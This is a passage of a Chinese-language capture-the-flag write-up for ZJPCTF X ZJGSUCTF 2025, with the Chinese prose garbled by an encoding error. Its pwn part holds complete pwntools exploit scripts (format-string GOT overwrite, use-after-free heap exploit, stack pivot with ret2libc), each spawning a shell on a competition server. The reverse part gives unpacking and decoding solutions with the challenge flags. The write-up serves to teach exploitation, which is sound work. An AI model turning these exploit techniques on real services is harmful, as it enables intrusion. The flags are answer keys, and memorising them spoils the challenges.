class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-comment">#return u32(io.recv()[0:4])</span><br><br>key=<span class="hljs-number">0x600d2c</span><br>leave_ret=<span class="hljs-number">0x400774</span><br>ret=<span class="hljs-number">0x400549</span><br><br>main_addr = elf.sym[<span class="hljs-string">&quot;main&quot;</span>]<br>puts_plt = elf.plt[<span class="hljs-string">&quot;puts&quot;</span>]<br>puts_got = elf.got[<span class="hljs-string">&quot;puts&quot;</span>]<br>start_addr = elf.sym[<span class="hljs-string">&quot;_start&quot;</span>]<br><br><br>payload1=fmtstr_payload(<span class="hljs-number">6</span>,&#123;key:<span class="hljs-number">22</span>&#125;)<br>sla(<span class="hljs-string">&quot;Tell me what&#x27;s your name?&quot;</span>,payload1)<br>payload2=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x38</span>+p64(start_addr)<br>sa(<span class="hljs-string">&#x27;Tell me more about you.&#x27;</span>,payload2)<br>payload3=fmtstr_payload(<span class="hljs-number">6</span>,&#123;elf.got[<span class="hljs-string">&#x27;printf&#x27;</span>]:elf.sym[<span class="hljs-string">&#x27;system&#x27;</span>]&#125;)<br>sa(<span class="hljs-string">&quot;Tell me what&#x27;s your name?&quot;</span>,payload3)<br>payload4=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x38</span>+p64(start_addr)<br>sa(<span class="hljs-string">&#x27;more about you&#x27;</span>,payload4)<br>payload5=<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span><br>sa(<span class="hljs-string">&quot;Tell me what&#x27;s your name?&quot;</span>,payload5)<br><br>inter()<br></code></pre></td></tr></table></figure><p>ä¹Ÿå¯ä»¥è€ƒè™‘æ ˆè¿ç§»ï¼Œä½†æ˜¯å¯èƒ½ä¼šæ›´éº»çƒ¦ä¸€äº›</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#include &lt;stdio.h&gt;</span><br><span class="hljs-comment">#include &lt;stdlib.h&gt;</span><br><span class="hljs-comment">#include &lt;sys/mman.h&gt;</span><br><span class="hljs-comment">#include &lt;unistd.h&gt;</span><br><br><span class="hljs-built_in">int</span> key;<br><br>void init() &#123;<br>    setbuf(stdin, NULL);<br>    setbuf(stdout, NULL);<br>    setbuf(stderr, NULL);<br>&#125;<br><br><span class="hljs-built_in">int</span> fake_flag()&#123;<br>    echo system(<span class="hljs-string">&quot;echo flag&quot;</span>);<br>&#125;<br><br><span class="hljs-built_in">int</span> magic() &#123;<br>    char buf[<span class="hljs-number">256</span>];<br>    puts(<span class="hljs-string">&quot;Welcome to 2025 ZJPCTF X ZJGSUCTF.&quot;</span>);<br>    puts(<span class="hljs-string">&quot;Tell me what&#x27;s your name?&quot;</span>);<br>    read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">0x100</span>);<br>    printf(<span class="hljs-string">&quot;Hello,&quot;</span>);<br>    <span class="hljs-keyword">return</span> printf(buf);<br>&#125;<br><br><span class="hljs-built_in">int</span> main(<span class="hljs-built_in">int</span> argc, const char **argv, const char **envp) &#123;<br>    char buf[<span class="hljs-number">48</span>];<br><br>    init();<br>    magic();<br>    <span class="hljs-keyword">if</span> (key == <span class="hljs-number">22</span>) &#123;<br>        puts(<span class="hljs-string">&quot;Tell me more about you.&quot;</span>);<br>        read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">0x40</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        puts(<span class="hljs-string">&quot;You are not allow in.&quot;</span>);<br>        puts(<span class="hljs-string">&quot;Please try again later.&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="ezheap"><a href="#ezheap" class="headerlink" title="ezheap"></a>ezheap</h2><p>é¢„è®¡è§£å‡ºäººæ•°ï¼š2</p><p>å®é™…è§£å‡ºäººæ•°ï¼š0</p><p>ç»å…¸å¢åˆ æ”¹æŸ¥</p><img src="/2025/05/14/ZJPCTF-X-ZJGSUCTF-2025-Reverse-Pwn-wp/1723989493843-9c512cdb-f898-4852-8f16-317c78632c5e.png" class="" title="img"><p>deleteå­˜åœ¨UAFæ¼æ´</p><img src="/2025/05/14/ZJPCTF-X-ZJGSUCTF-2025-Reverse-Pwn-wp/1723989541579-a4522fed-06c7-43a4-955e-d69c5bc6d4b8.png" class="" title="img"><p>ä¸€æ¬¡createç»è¿‡ä¸¤æ¬¡mallocï¼Œåˆ†åˆ«æ˜¯structå’Œcontent</p><img src="/2025/05/14/ZJPCTF-X-ZJGSUCTF-2025-Reverse-Pwn-wp/1723991373823-6c6f3e48-ae92-4f9b-914d-434f24f6e7d6.png" class="" title="img"><p>showçš„æ—¶å€™æ˜¯å‡½æ•°æŒ‡é’ˆåŠ contentï¼Œå°†ptr[i][1]å¤„åŸå…ˆçš„print_contentå‡½æ•°æ”¹æˆsystemï¼Œptr[v1]æ”¹å†™æˆbin&#x2F;shçš„åœ°å€ï¼Œè¿™æ ·åœ¨æ‰§è¡Œshowçš„æ—¶å€™å°±ä¼šæ‰§è¡Œsystemï¼ˆâ€™&#x2F;bin&#x2F;shâ€™ï¼‰</p><img src="/2025/05/14/ZJPCTF-X-ZJGSUCTF-2025-Reverse-Pwn-wp/1723991398089-90c3e49d-7e3a-4cd4-93b8-b904b22deff8.png" class="" title="img"><p>ç”±äºfastbinæ˜¯FILOï¼Œå…ˆå†™&#x2F;bin&#x2F;shå†å†™system</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>filename=<span class="hljs-string">&#x27;ezheap&#x27;</span><br>elf=ELF(filename)<br>context(arch = elf.arch,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>)<br><br>debug = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> debug:<br>p = process(filename)<br><span class="hljs-keyword">else</span>:<br>    p = remote(<span class="hljs-string">&#x27;124.221.156.93&#x27;</span>,<span class="hljs-number">32820</span>)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size,content</span>):<br>p.recvuntil(<span class="hljs-string">&quot;Your choice: &quot;</span>)<br>p.sendline(<span class="hljs-string">&quot;1&quot;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;Please input size: &quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(size))<br>p.recvuntil(<span class="hljs-string">&quot;Please input content: &quot;</span>)<br>p.send(content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br>p.recvuntil(<span class="hljs-string">&quot;Your choice: &quot;</span>)<br>p.sendline(<span class="hljs-string">&quot;2&quot;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;Please input list index: &quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>p.recvuntil(<span class="hljs-string">&quot;Your choice: &quot;</span>)<br>p.sendline(<span class="hljs-string">&quot;3&quot;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;Please input list index: &quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(index))<br><br>bin_sh=<span class="hljs-number">0x602010</span><br>system=elf.plt[<span class="hljs-string">&#x27;system&#x27;</span>]<br><br>add(<span class="hljs-number">0x80</span>,<span class="hljs-string">&quot;aaaa&quot;</span>)<br>add(<span class="hljs-number">0x80</span>,<span class="hljs-string">&quot;bbbb&quot;</span>)<br><br>delete(<span class="hljs-number">0</span>)<br>delete(<span class="hljs-number">1</span>)<br><br>add(<span class="hljs-number">0x10</span>,p64(bin_sh) + p64(system))<br><br>show(<span class="hljs-number">0</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="ezstack"><a href="#ezstack" class="headerlink" title="ezstack"></a>ezstack</h2><p>é¢„è®¡è§£å‡ºäººæ•°ï¼š1</p><p>å®é™…è§£å‡ºäººæ•°ï¼š1</p><img src="/2025/05/14/ZJPCTF-X-ZJGSUCTF-2025-Reverse-Pwn-wp/1746862407562-5c97df18-74fe-4b6b-b7ef-c771b9494e76.png" class="" title="img"><p>å¸¸è§„æ ˆè¿ç§»</p><img src="/2025/05/14/ZJPCTF-X-ZJGSUCTF-2025-Reverse-Pwn-wp/1746862319235-1e668e49-1079-4e9d-9b27-ed0a1b46153a.png" class="" title="img"><p>åˆšå¥½èƒ½æº¢å‡ºåˆ°è¿”å›åœ°å€</p><img src="/2025/05/14/ZJPCTF-X-ZJGSUCTF-2025-Reverse-Pwn-wp/1746862343813-280696f7-70be-4e87-b04f-97e727380fe2.png" class="" title="img"><p>æœ¬è´¨æ˜¯æ ˆè¿ç§»+ret2libc</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> struct <span class="hljs-keyword">import</span> pack<br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">import</span> time<br><span class="hljs-comment">#from LibcSearcher import *</span><br><br>filename=<span class="hljs-string">&#x27;./ezstack&#x27;</span><br>elf = ELF(filename)<br>libc = ELF(<span class="hljs-string">&quot;./libc.so.6&quot;</span>)<br>context(arch = elf.arch,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>)<br><br>debug = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> debug:<br>io = process(filename)<br><span class="hljs-keyword">else</span>:<br>io = remote(<span class="hljs-string">&#x27;124.221.156.93&#x27;</span>,<span class="hljs-number">32835</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">s</span>(<span class="hljs-params">a</span>) : io.send(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sa</span>(<span class="hljs-params">a, b</span>) : io.sendafter(a, b)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sl</span>(<span class="hljs-params">a</span>) : io.sendline(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sla</span>(<span class="hljs-params">a, b</span>) : io.sendlineafter(a, b)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">r</span>() : <span class="hljs-keyword">return</span> io.recv()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pr</span>() : <span class="hljs-built_in">print</span>(io.recv())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ru</span>(<span class="hljs-params">a</span>) : <span class="hljs-keyword">return</span> io.recvuntil(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">inter</span>() : io.interactive()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():<br>    gdb.attach(io)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_addr</span>():<br><span class="hljs-keyword">return</span> u64(io.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-comment">#return u32(io.recv()[0:4])</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_sb</span>() : <br><span class="hljs-keyword">return</span> base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>], base + <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>))<br><br>bss=elf.bss()+<span class="hljs-number">0x500</span><br>ret=<span class="hljs-number">0x400519</span><br>leave_ret=<span class="hljs-number">0x4006c6</span><br>pop_rdi=<span class="hljs-number">0x400763</span><br>puts_got=elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>puts_plt=elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>read=<span class="hljs-number">0x4006ab</span><br>pop_rbp = <span class="hljs-number">0x4005c0</span><br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x30</span> + p64(bss + <span class="hljs-number">0x30</span>) + p64(read)<br>sa(<span class="hljs-string">b&quot;This is a stack migration challenge.Have a good time.&quot;</span>, payload)<br>payload2 = p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(pop_rbp) + p64(bss + <span class="hljs-number">0x300</span> + <span class="hljs-number">0x30</span>) + p64(read)<br>payload2 += p64(bss - <span class="hljs-number">8</span>) + p64(leave_ret)<br>s(payload2)<br>base = get_addr() - libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(base))<br>system, bin_sh = get_sb()<br>payload3 = (p64(pop_rdi) + p64(bin_sh) + p64(ret) + p64(ret) + p64(system)).ljust(<span class="hljs-number">0x30</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>payload3+=p64(bss + <span class="hljs-number">0x300</span> - <span class="hljs-number">8</span>) + p64(leave_ret)<br>s(payload3)<br>inter()<br></code></pre></td></tr></table></figure><h1 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h1><h2 id="é€†å‘çš„æœ¬è´¨"><a href="#é€†å‘çš„æœ¬è´¨" class="headerlink" title="é€†å‘çš„æœ¬è´¨"></a>é€†å‘çš„æœ¬è´¨</h2><p>é¢„æœŸè§£å‡ºäººæ•°ï¼š20+</p><p>å®é™…è§£å‡ºäººæ•°ï¼š58</p><p>æ•…äº‹é‡Œçš„â€œåå‘ç»½æ”¾â€ï¼Œâ€œä»å³è‡³å·¦â€ï¼Œâ€œç›¸åè½¨è¿¹â€éƒ½åœ¨æç¤ºå°†å­—ç¬¦ä¸²å€’ç½®</p><img src="/2025/05/14/ZJPCTF-X-ZJGSUCTF-2025-Reverse-Pwn-wp/1746499747037-9c9a7086-6a6c-4226-aae7-36684c84cf76.png" class="" title="img"><p>ç›´æ¥pythonå€’ç½®å­—ç¬¦ä¸²æˆ–è€…æ‰‹åŠ¨ç¿»è½¬ä¹Ÿè¡Œ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">s=<span class="hljs-string">&#x27;&#125;detacitsihpos_3b_ot_tub_llik_dn@_thg1f_ot_ton_s1_esrever_f0_ecn3sse_ehT&#123;galf&#x27;</span><br><span class="hljs-built_in">print</span>(s[::-<span class="hljs-number">1</span>])<br>flag&#123;The_ess3nce_0f_reverse_1s_not_to_f1ght_@nd_kill_but_to_b3_sophisticated&#125;<br></code></pre></td></tr></table></figure><h2 id="Unpack"><a href="#Unpack" class="headerlink" title="Unpack"></a>Unpack</h2><p>é¢„æœŸè§£å‡ºäººæ•°ï¼š10+</p><p>å®é™…è§£å‡ºäººæ•°ï¼š32</p><p>è¯†åˆ«ä¸ºupxå£³ï¼Œä½†æ— æ³•ç›´æ¥upx -d</p><img src="/2025/05/14/ZJPCTF-X-ZJGSUCTF-2025-Reverse-Pwn-wp/1746499164479-189f03b8-14ab-47d4-bf61-a5c8d6466753.png" class="" title="img"><p>010editor æ‰“å¼€ç¨‹åºï¼ŒæŠŠé‡Œé¢çš„ubxéƒ½æ”¹ä¸ºUPX</p><img src="/2025/05/14/ZJPCTF-X-ZJGSUCTF-2025-Reverse-Pwn-wp/1746499168428-837763ce-a72e-47ea-bb39-7dbc8fee139b.png" class="" title="img"><img src="/2025/05/14/ZJPCTF-X-ZJGSUCTF-2025-Reverse-Pwn-wp/1746499173048-fc224c01-c696-4108-b9eb-4ccb7d22ca48.png" class="" title="img"><p>ç”¨upxè¿›è¡Œè„±å£³</p><img src="/2025/05/14/ZJPCTF-X-ZJGSUCTF-2025-Reverse-Pwn-wp/1746499179262-cf94524d-1343-4c51-9807-08412d4e4dab.png" class="" title="img"><p>å¾—åˆ°åŠ å¯†é€»è¾‘</p><img src="/2025/05/14/ZJPCTF-X-ZJGSUCTF-2025-Reverse-Pwn-wp/1746499187426-4de337bd-3e3b-47d3-a4a6-d1ad41deadf2.png" class="" title="img"><p>å†™è„šæœ¬è¿›è¡Œç ´è§£</p><img src="/2025/05/14/ZJPCTF-X-ZJGSUCTF-2025-Reverse-Pwn-wp/1746499196090-49ce6d67-d507-4c5c-91a3-4b15cde8b036.png" class="" title="img"><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs cpp">flag&#123;Upx_1s_n0t_d1fficult&#125;<br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span>  </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span>  </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span>  </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;time.h&gt;</span>  </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;Windows.h&gt;</span>  </span><br><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> ida_chars[] =<br>&#123;<br><span class="hljs-number">0x6D</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0x69</span>, <span class="hljs-number">0x70</span>, <span class="hljs-number">0x51</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0x76</span>, <span class="hljs-number">0x54</span>, <span class="hljs-number">0x35</span>,<br><span class="hljs-number">0x76</span>, <span class="hljs-number">0x51</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x34</span>, <span class="hljs-number">0x71</span>, <span class="hljs-number">0x51</span>, <span class="hljs-number">0x6F</span>, <span class="hljs-number">0x35</span>, <span class="hljs-number">0x63</span>, <span class="hljs-number">0x68</span>,<br><span class="hljs-number">0x62</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0x70</span>, <span class="hljs-number">0x62</span>, <span class="hljs-number">0x7F</span>, <span class="hljs-number">0x79</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x0B</span>, <span class="hljs-number">0x04</span>,<br><span class="hljs-number">0x05</span>, <span class="hljs-number">0x0E</span><br>&#125;;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">short</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">26</span>;i++)&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c&quot;</span>, (<span class="hljs-type">int</span>)((<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>)ida_chars[i] ^ ida_chars[i % <span class="hljs-number">4</span> + <span class="hljs-number">28</span>]));<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>éé¢„æœŸ</p><img src="/2025/05/14/ZJPCTF-X-ZJGSUCTF-2025-Reverse-Pwn-wp/1746976737472-b2103a74-5e26-4c59-b0c5-5f799de0aa90.png" class="" title="img"><h2 id="HarRE"><a href="#HarRE" class="headerlink" title="HarRE"></a>HarRE</h2><p>é¢„æœŸè§£å‡ºäººæ•°ï¼š10+</p><p>å®é™…è§£å‡ºäººæ•°ï¼š2</p><p>æ‹¿åˆ°hapæ–‡ä»¶ï¼Œå¾—çŸ¥æ˜¯é¸¿è’™appå®‰è£…åŒ…ï¼Œæ”¹åç¼€ä¸ºzipåè§£å‹</p><img src="/2025/05/14/ZJPCTF-X-ZJGSUCTF-2025-Reverse-Pwn-wp/1746498670287-2fd0c96f-a901-4d2b-947e-1015d13f200b.png" class="" title="img"><p>åœ¨etsæ–‡ä»¶å¤¹ä¸‹é¢æ‰¾åˆ°abcæ–‡ä»¶ï¼Œç„¶åä½¿ç”¨<a href="https://github.com/ohos-decompiler/abc-decompiler">abc-decompiler</a>è¿›è¡Œåç¼–è¯‘ï¼Œentry&#x2F;src&#x2F;main&#x2F;ets&#x2F;pagesä¸‹æ‰¾åˆ°ä¸»é€»è¾‘</p><img src="/2025/05/14/ZJPCTF-X-ZJGSUCTF-2025-Reverse-Pwn-wp/1746498693124-6c3c82ff-bdc4-46b9-b43f-b2aebef9111e.png" class="" title="img"><p>å¯ä»¥çœ‹åˆ°customBase64EncodeæŠŠinputTextè¿›è¡Œäº†ç¼–ç ï¼Œç„¶ååœ¨å˜é‡ä¸­æ‰¾åˆ°ç è¡¨</p><img src="/2025/05/14/ZJPCTF-X-ZJGSUCTF-2025-Reverse-Pwn-wp/1746498698387-d16640c1-aab9-4a1e-8e5f-c1ff7c497afd.png" class="" title="img"><p>ç„¶åå°±èƒ½è§£å‡ºflag</p><img src="/2025/05/14/ZJPCTF-X-ZJGSUCTF-2025-Reverse-Pwn-wp/1746498707527-67f6cb32-b4aa-47b6-84fa-950314f721bb.png" class="" title="img"><figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs erlang-repl">flag&#123;Oh_y0u_knOw_the_Harmony1!!&#125;<br></code></pre></td></tr></table></figure><p>stringå¤§æ³•ç›´æ¥éé¢„æœŸ</p><img src="/2025/05/14/ZJPCTF-X-ZJGSUCTF-2025-Reverse-Pwn-wp/1746498520695-b5db959e-d23e-44d0-bc77-ed400189744d.png" class="" title="img"><img src="/2025/05/14/ZJPCTF-X-ZJGSUCTF-2025-Reverse-Pwn-wp/1746498568826-b13a1139-6885-4cb7-bf4e-6e14ff0594c6.png" class="" title="img"><h2 id="LoginSystem"><a href="#LoginSystem" class="headerlink" title="LoginSystem"></a>LoginSystem</h2><p>é¢„æœŸè§£å‡ºäººæ•°ï¼š0</p><p>å®é™…è§£å‡ºäººæ•°ï¼š3</p><p>ä¸¤ä¸ªç®—æ³•å¾ˆæ˜æ˜¾ï¼Œä¹Ÿæ²¡æœ‰ç”¨æ··æ·†å’Œjniï¼Œsoå±‚é­”æ”¹çš„è¯ä¼šæ›´åŠ éš¾ä»¥è¯†åˆ«</p><img src="/2025/05/14/ZJPCTF-X-ZJGSUCTF-2025-Reverse-Pwn-wp/1747184064154-9614e188-3692-42f8-a8cb-f18bf1300b6f.png" class="" title="img"><p>é­”æ”¹çš„base64ç®—æ³•åŠ å¯†usernameï¼Œå…·ä½“é­”æ”¹ç‚¹ä¸ºæŠŠåŠ å¯†åçš„æ•°æ®ä¸­é—´ä¸¤ä½è°ƒæ¢</p><img src="/2025/05/14/ZJPCTF-X-ZJGSUCTF-2025-Reverse-Pwn-wp/1747183828113-4ca6f98c-3e1c-415e-aeec-1d3065ea362c.png" class="" title="img"><img src="/2025/05/14/ZJPCTF-X-ZJGSUCTF-2025-Reverse-Pwn-wp/1747184146555-c62b2dce-a2d1-42b2-88e5-0cb13e401e9a.png" class="" title="img"><p>å­¦å¼Ÿç”¨aiå†™çš„è„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">decode_custom_base64</span>(<span class="hljs-params">s</span>):<br>    <span class="hljs-comment"># é­”æ”¹Base64å­—ç¬¦è¡¨</span><br>    BASE64_TABLE = <span class="hljs-string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span><br>    table = &#123;char: idx <span class="hljs-keyword">for</span> idx, char <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(BASE64_TABLE)&#125;<br>    bytes_list = []<br>    s = s.rstrip(<span class="hljs-string">&#x27;=&#x27;</span>) <span class="hljs-comment"># å»é™¤æœ«å°¾ç­‰å·é¿å…â¼²æ‰°</span><br>    <span class="hljs-comment"># æ¯æ¬¡å¤„ç†4ä¸ªå­—ç¬¦</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(s), <span class="hljs-number">4</span>):<br>        chunk = s[i:i + <span class="hljs-number">4</span>].ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;=&#x27;</span>) <span class="hljs-comment"># è¡¥â¾œ4å­—ç¬¦</span><br>        c1, c2, c3, c4 = chunk<br>        <span class="hljs-comment"># å­—ç¬¦è½¬6ä½å€¼ï¼ˆç­‰å·è§†ä¸º0ï¼‰</span><br>        v1 = table.get(c1, <span class="hljs-number">0</span>)<br>        v2 = table.get(c2, <span class="hljs-number">0</span>)<br>        v3 = table.get(c3, <span class="hljs-number">0</span>)<br>        v4 = table.get(c4, <span class="hljs-number">0</span>)<br>        <span class="hljs-comment"># é€†å‘é­”æ”¹ç¼–ç è§„åˆ™è®¡ç®—åŸå§‹å­—èŠ‚</span><br>        byte1 = (v1 &lt;&lt; <span class="hljs-number">2</span>) | ((v3 &gt;&gt; <span class="hljs-number">4</span>) &amp; <span class="hljs-number">0x03</span>)<br>        byte2 = 